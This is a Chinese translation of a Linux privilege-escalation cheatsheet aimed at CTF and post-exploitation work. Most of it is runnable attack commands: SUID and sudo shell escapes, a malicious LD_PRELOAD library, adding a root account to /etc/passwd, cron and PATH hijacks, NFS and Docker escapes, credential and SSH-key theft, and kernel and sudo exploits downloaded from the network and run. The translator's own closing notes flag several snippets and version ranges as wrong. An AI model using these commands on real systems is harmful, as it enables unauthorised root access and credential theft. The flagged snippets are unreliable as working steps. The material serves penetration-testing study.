<a id="-linux-privilege-escalation---complete-cheatsheet"></a>
# 🐧 Linux 权限提升完整速查表

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](./README.tr.md) • [🇬🇷 Ελληνικά](./README.el.md)

```
  ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗
  ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝
  ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝ 
  ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗ 
  ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗
  ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Linux-PrivEsc-red?style=for-the-badge" alt="Linux PrivEsc">
  <img src="https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge" alt="Post Exploitation">
  <img src="https://img.shields.io/badge/Root-Access-blue?style=for-the-badge" alt="Root">
  <img src="https://img.shields.io/badge/CTF-Ready-green?style=for-the-badge" alt="CTF">
</p>

<p align="center">
  <b>🔓 Linux 系统权限提升完整指南</b>
</p>

---

<a id="-table-of-contents"></a>
## 📋 目录

- [信息枚举](#-enumeration)
- [SUID/SGID](#-suidsgid)
- [权能（Capabilities）](#-capabilities)
- [Sudo 利用](#-sudo-exploitation)
- [Cron 定时任务](#-cron-jobs)
- [PATH 劫持](#-path-hijacking)
- [NFS root 权限压缩（Root Squashing）](#-nfs-root-squashing)
- [内核漏洞利用](#-kernel-exploits)
- [密码搜寻](#-password-mining)
- [SSH 密钥](#-ssh-keys)
- [可写文件](#-writable-files)
- [Docker 逃逸](#-docker-escape)
- [速查](#-quick-reference)

---

<a id="-enumeration"></a>
## 🔍 信息枚举

<a id="system-information"></a>
### 系统信息

```bash
# 主机名
hostname

# 操作系统与内核
cat /etc/os-release
cat /etc/issue
uname -a
uname -r

# 架构
arch
uname -m

# CPU 信息
cat /proc/cpuinfo
lscpu
```

<a id="user-information"></a>
### 用户信息

```bash
# 当前用户
whoami
id

# 所有用户
cat /etc/passwd
cat /etc/passwd | grep -v "nologin\|false"

# 用户组
groups
cat /etc/group

# 已登录用户
w
who
users

# 最近登录记录
last
lastlog

# Sudo 权限
sudo -l
```

<a id="network-information"></a>
### 网络信息

```bash
# IP 地址
ip a
ifconfig

# 路由
ip route
route -n

# 开放端口
netstat -tulpn
ss -tulpn

# 活动连接
netstat -an
ss -an

# ARP 缓存
arp -a
ip neigh

# DNS
cat /etc/resolv.conf

# 主机映射
cat /etc/hosts
```

<a id="process--services"></a>
### 进程与服务

```bash
# 运行中的进程
ps aux
ps -ef
ps aux | grep root

# 服务
systemctl list-units --type=service
service --status-all

# 已安装的软件包
dpkg -l                    # Debian/Ubuntu
rpm -qa                    # RHEL/CentOS
```

<a id="scheduled-tasks"></a>
### 计划任务

```bash
# crontab 配置
crontab -l
ls -la /etc/cron*
cat /etc/crontab
cat /etc/cron.d/*

# systemd 定时器
systemctl list-timers
```

---

<a id="-suidsgid"></a>
## 🔐 SUID/SGID

<a id="find-suid-binaries"></a>
### 查找 SUID 可执行文件

```bash
# 查找 SUID 文件
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# 查找 SGID 文件
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# 同时查找两者
find / -perm /6000 -type f 2>/dev/null
```

<a id="common-exploitable-suid-binaries"></a>
### 常见可利用的 SUID 可执行文件

可在 [GTFOBins](https://gtfobins.github.io/) 查阅利用方式！

<a id="bash"></a>
#### **bash**
```bash
# bash 设置了 SUID 的情况
./bash -p
```

<a id="find"></a>
#### **find**
```bash
find . -exec /bin/sh -p \; -quit
```

<a id="vim"></a>
#### **vim**
```bash
vim -c ':!/bin/sh'
```

<a id="nmap-old-versions"></a>
#### **nmap** (旧版本)
```bash
nmap --interactive
!sh
```

<a id="python"></a>
#### **python**
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

<a id="perl"></a>
#### **perl**
```bash
perl -e 'exec "/bin/sh";'
```

<a id="lessmore"></a>
#### **less/more**
```bash
less /etc/passwd
!/bin/sh
```

<a id="cp"></a>
#### **cp**
```bash
# 复制 /etc/passwd，添加 root 用户后再复制回去（示例问题见译注）
LFILE=/etc/passwd
cp /etc/passwd /tmp/passwd.bak
echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /tmp/passwd
cp /tmp/passwd $LFILE
```

<a id="env"></a>
#### **env**
```bash
env /bin/sh -p
```

---

<a id="-capabilities"></a>
## ⚡ 权能（Capabilities）

<a id="find-capabilities"></a>
### 查找文件权能

```bash
# 获取文件权能
getcap -r / 2>/dev/null

# 常见危险权能
# CAP_SETUID：更改 UID
# CAP_NET_RAW：使用原始套接字
# CAP_DAC_READ_SEARCH：读取任意文件（仍有其他访问限制）
```

<a id="exploit-capabilities"></a>
### 利用文件权能

<a id="python-cap_setuid"></a>
#### **Python (cap_setuid)**
```bash
# python 具有 cap_setuid+ep 的情况
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

<a id="perl-cap_setuid"></a>
#### **Perl (cap_setuid)**
```bash
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
```

<a id="tar-cap_dac_read_search"></a>
#### **tar (cap_dac_read_search)**
```bash
# 读取任意文件
tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
cat etc/shadow
```

<a id="vim-cap_setuid"></a>
#### **vim (cap_setuid)**
```bash
vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

---

<a id="-sudo-exploitation"></a>
## 🔑 Sudo 利用

<a id="check-sudo-permissions"></a>
### 检查 Sudo 权限

```bash
sudo -l
# 查找 NOPASSWD 条目
# 查找 (ALL) 或 (root) 条目
```

<a id="exploit-sudo"></a>
### 利用 Sudo

<a id="sudo-all"></a>
#### **sudo ALL**
```bash
sudo /bin/bash
sudo su
```

<a id="ld_preload"></a>
#### **LD_PRELOAD**
```bash
# sudo -l 中包含 env_keep+=LD_PRELOAD 的情况
# 创建恶意库

cat > /tmp/shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/any_allowed_program
```

<a id="sudo-vim"></a>
#### **sudo vim**
```bash
sudo vim -c ':!/bin/sh'
```

<a id="sudo-lessmore"></a>
#### **sudo less/more**
```bash
sudo less /etc/passwd
!/bin/sh
```

<a id="sudo-find"></a>
#### **sudo find**
```bash
sudo find /tmp -exec /bin/sh \;
```

<a id="sudo-nmap-interactive"></a>
#### **sudo nmap** (交互模式)
```bash
sudo nmap --interactive
!sh
```

<a id="sudo-tar"></a>
#### **sudo tar**
```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

<a id="sudo-zip"></a>
#### **sudo zip**
```bash
sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/sh"
```

<a id="sudo-env"></a>
#### **sudo env**
```bash
sudo env /bin/sh
```

<a id="sudo-awk"></a>
#### **sudo awk**
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

<a id="sudo-man"></a>
#### **sudo man**
```bash
sudo man man
!/bin/sh
```

<a id="sudo-apache2"></a>
#### **sudo apache2**
```bash
sudo apache2 -f /etc/shadow
# 泄露 shadow 的第一行
```

<a id="sudo-version-exploits"></a>
### Sudo 版本相关漏洞利用

```bash
# 检查版本
sudo --version

# CVE-2019-14287 (sudo < 1.8.28)
sudo -u#-1 /bin/bash

# CVE-2021-3156 (Baron Samedit)
# sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
```

---

<a id="-cron-jobs"></a>
## ⏰ Cron 定时任务

<a id="find-cron-jobs"></a>
### 查找 Cron 定时任务

```bash
# 系统 crontab
cat /etc/crontab

# Cron 目录
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# 用户 crontab
cat /var/spool/cron/crontabs/*

# 观察 Cron 任务
# 使用 pspy 监控进程
```

<a id="exploit-cron-jobs"></a>
### 利用 Cron 定时任务

<a id="writable-cron-script"></a>
#### **可写的 Cron 脚本**
```bash
# Cron 执行的脚本可由当前用户写入的情况：
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /path/to/script.sh

# 等待 Cron 执行后，再运行：
/tmp/bash -p
```

<a id="wildcard-injection-tar"></a>
#### **通配符注入（tar）**
```bash
# Cron 执行以下命令的情况：tar czf /tmp/backup.tar.gz *

# 创建恶意文件
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh
touch "/path/--checkpoint=1"
touch "/path/--checkpoint-action=exec=sh shell.sh"
```

<a id="path-exploitation"></a>
#### **PATH 利用**
```bash
# Cron 使用相对路径，且可以控制 PATH 的情况
# crontab 显示：PATH=/home/user:/usr/local/bin:...
# 脚本调用 backup.sh（未使用完整路径）

# 在 PATH 中可写的目录创建伪造脚本
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/backup.sh
chmod +x /home/user/backup.sh
```

---

<a id="-path-hijacking"></a>
## 🛤️ PATH 劫持

<a id="find-vulnerable-scripts"></a>
### 查找存在风险的脚本

```bash
# 查找由 root 执行且使用相对路径的脚本
# 检查 SUID 脚本（限制见译注）
# 检查 Cron 脚本
# 检查 systemd 服务
```

<a id="exploit-path"></a>
### 利用 PATH

```bash
# root 脚本调用 'service' 且未使用完整路径的情况
# 并且能够控制 PATH：

# 创建恶意的 'service'
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH

# 运行存在风险的脚本
./vulnerable_script
```

---

<a id="-nfs-root-squashing"></a>
## 📁 NFS root 权限压缩（Root Squashing）

<a id="find-nfs-shares"></a>
### 查找 NFS 共享

```bash
# 在攻击者机器上
showmount -e target_ip

# 检查导出配置
cat /etc/exports
# 查找 no_root_squash
```

<a id="exploit-no_root_squash"></a>
### 利用 no_root_squash

```bash
# 在攻击者机器上（以 root 身份）：
mkdir /tmp/nfs
mount -o rw target_ip:/share /tmp/nfs
cp /bin/bash /tmp/nfs/
chmod +s /tmp/nfs/bash

# 在目标机器上：
/share/bash -p
```

---

<a id="-kernel-exploits"></a>
## 💣 内核漏洞利用

<a id="check-kernel-version"></a>
### 检查内核版本

```bash
uname -r
uname -a
cat /proc/version
```

<a id="common-kernel-exploits"></a>
### 常见内核漏洞利用

| CVE | 内核版本 | 名称 |
|-----|----------------|------|
| CVE-2016-5195 | 2.x - 4.8.3 | **Dirty COW** |
| CVE-2021-4034 | 全部 | **PwnKit** |
| CVE-2021-3156 | sudo < 1.9.5p2 | **Baron Samedit** |
| CVE-2022-0847 | 5.8 - 5.16.11 | **Dirty Pipe** |
| CVE-2022-2588 | 5.x | **DirtyCred** |

<a id="dirty-cow-cve-2016-5195"></a>
### Dirty COW (CVE-2016-5195)
```bash
# 下载并编译
wget https://www.exploit-db.com/download/40839
gcc -pthread 40839.c -o dirty -lcrypt
./dirty
```

<a id="pwnkit-cve-2021-4034"></a>
### PwnKit (CVE-2021-4034)
```bash
# 下载
git clone https://github.com/ly4k/PwnKit
cd PwnKit
chmod +x PwnKit
./PwnKit
```

<a id="dirty-pipe-cve-2022-0847"></a>
### Dirty Pipe (CVE-2022-0847)
```bash
# 先检查内核版本
uname -r

# 下载并编译
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
./exploit-1
```

---

<a id="-password-mining"></a>
## 🔑 密码搜寻

<a id="search-for-passwords"></a>
### 搜索密码

```bash
# 在文件中
grep -r "password" /home/ 2>/dev/null
grep -r "pass" /etc/ 2>/dev/null
grep -ri "password" /var/www/ 2>/dev/null

# 配置文件
cat /var/www/html/wp-config.php
cat /var/www/html/config.php
cat /etc/mysql/my.cnf

# 历史记录文件
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.nano_history

# 环境变量
env
printenv
```

<a id="password-files"></a>
### 密码文件

```bash
# shadow 文件（原文标注需要 root；实际取决于读取权限）
cat /etc/shadow

# shadow 中的密码哈希
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt
```

<a id="common-locations"></a>
### 常见位置

```bash
# Web 配置
/var/www/html/wp-config.php
/var/www/html/config.php
/var/www/html/.htpasswd

# 数据库配置
/etc/mysql/my.cnf
/etc/postgresql/*/main/pg_hba.conf

# SSH
/home/*/.ssh/id_rsa
/root/.ssh/id_rsa

# 备份文件
find / -name "*.bak" 2>/dev/null
find / -name "*.backup" 2>/dev/null
```

---

<a id="-ssh-keys"></a>
## 🔐 SSH 密钥

<a id="find-ssh-keys"></a>
### 查找 SSH 密钥

```bash
# 私钥
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# 已授权的公钥
cat /home/*/.ssh/authorized_keys
cat /root/.ssh/authorized_keys
```

<a id="exploit-ssh-keys"></a>
### 利用 SSH 密钥

```bash
# 找到可读私钥的情况：
chmod 600 id_rsa
ssh -i id_rsa user@localhost
ssh -i id_rsa root@localhost
```

<a id="add-your-ssh-key"></a>
### 添加自己的 SSH 密钥

```bash
# 在攻击者机器上生成密钥
ssh-keygen -t rsa -b 4096

# 能够写入 authorized_keys 的情况：
echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys
echo "YOUR_PUBLIC_KEY" >> /home/user/.ssh/authorized_keys
```

---

<a id="-writable-files"></a>
## 📝 可写文件

<a id="critical-writable-files"></a>
### 关键可写文件

```bash
# 检查写权限
ls -la /etc/passwd
ls -la /etc/shadow
ls -la /etc/sudoers
```

<a id="exploit-writable-etcpasswd"></a>
### 利用可写的 /etc/passwd

```bash
# 生成密码哈希
openssl passwd -1 -salt hacker password
# 结果：$1$hacker$TzyKlv0/R/c28R.GAeLw.1

# 添加 root 用户
echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0::/root:/bin/bash' >> /etc/passwd

# 登录
su hacker
# 密码：password
```

<a id="find-world-writable-files"></a>
### 查找所有用户均可写的文件

```bash
find / -writable -type f 2>/dev/null
find / -perm -222 -type f 2>/dev/null
find / -perm -o+w -type f 2>/dev/null

# 所有用户均可写的目录
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
```

---

<a id="-docker-escape"></a>
## 🐳 Docker 逃逸

<a id="check-if-in-docker"></a>
### 检查是否位于 Docker 中

```bash
# 检查 .dockerenv
ls -la /.dockerenv

# 检查 cgroup
cat /proc/1/cgroup | grep docker

# 检查主机名（随机字符串）
hostname
```

<a id="docker-socket-mount"></a>
### Docker 套接字挂载

```bash
# docker.sock 已挂载的情况
find / -name docker.sock 2>/dev/null
ls -la /var/run/docker.sock

# 利用 Docker 套接字逃逸
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

<a id="privileged-container"></a>
### 特权容器

```bash
# 容器以特权模式运行的情况
fdisk -l                    # 查看宿主机磁盘
mount /dev/sda1 /mnt
chroot /mnt
```

---

<a id="-quick-reference"></a>
## 📊 速查

<a id="one-liner-enumeration"></a>
### 单行命令枚举

```bash
# 快速查看系统信息
id; hostname; uname -a; cat /etc/issue

# 快速查找 SUID
find / -perm -4000 -type f 2>/dev/null

# 快速查看权能
getcap -r / 2>/dev/null

# 快速检查 sudo
sudo -l

# 快速检查 Cron
cat /etc/crontab; ls -la /etc/cron*

# 快速搜索密码
grep -r "password" /home/ 2>/dev/null
```

<a id="automated-tools"></a>
### 自动化工具

| 工具 | 说明 |
|------|-------------|
| **LinPEAS** | 全面枚举 |
| **LinEnum** | Linux 枚举 |
| **linux-smart-enumeration** | LSE |
| **pspy** | 进程监控 |

<a id="quick-wins-checklist"></a>
### 快速检查清单

- [ ] `sudo -l` - 检查 sudo 权限
- [ ] SUID 可执行文件：查找并对照 GTFOBins
- [ ] 权能（Capabilities） - `getcap -r / 2>/dev/null`
- [ ] Cron 定时任务：脚本是否可写？
- [ ] 内核版本：是否存在已知利用？
- [ ] 可读的 /etc/shadow
- [ ] 可写的 /etc/passwd
- [ ] /home/* 或 /root 中的 SSH 密钥
- [ ] Docker 套接字已挂载
- [ ] 配置了 no_root_squash 的 NFS

---

<a id="-resources"></a>
## 📚 参考资料

- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks Linux 权限提升](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

<a id="related-cheatsheets"></a>
### 相关速查表
- LinPEAS（本仓库未提供对应指南；原文路径：`../LinPEAS/README.md`）
- [Windows 权限提升](../../Windows-PrivEsc/translations/README.zh-CN.md)

---

<p align="center">
  <b>🐧 获取 root 权限！</b><br>
  <i>掌握 Linux 权限提升</i>
</p>

> 译注：“内核漏洞”表混入了用户态漏洞：[PwnKit 是 polkit 的 pkexec 漏洞](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034)，[Baron Samedit 则是 sudo 漏洞](https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt)。版本表仅作历史概括，还须核对发行版回移补丁；[Dirty Pipe 原始披露](https://dirtypipe.cm4all.com/)明确列出已在 5.16.11、5.15.25 和 5.10.102 修复，因此不能把 5.16.11 当作受影响范围的包含端点。sudoedit 的单行示例是触发示意，不是完整提权利用。

> 译注：[GNU find 文档](https://www.gnu.org/software/findutils/manual/html_node/find_html/Mode-Bits.html)区分当前用户可写的 -writable 与权限位检查；-perm -222 要求三类写权限位均设置，不能与“当前用户可写”混为一谈。SUID／sudo／权能利用还依赖二进制构建、Shell 是否保留有效身份、挂载选项及安全策略；[execve(2) 手册](https://man7.org/linux/man-pages/man2/execve.2.html)说明 Linux 忽略脚本上的 SUID／SGID 位。Docker 套接字和特权容器的影响也取决于实际挂载、用户命名空间与守护进程权限。

> 译注：原文技术片段保持原样。cp 示例用单引号包住命令替换表达式，且未先创建其后使用的 /tmp/passwd；不能直接得到预期密码条目。Dirty COW 下载命令也没有明确保存为后续编译所用的 40839.c。具体文件名、哈希、依赖和执行条件须另行核对，不能视为已验证脚本。
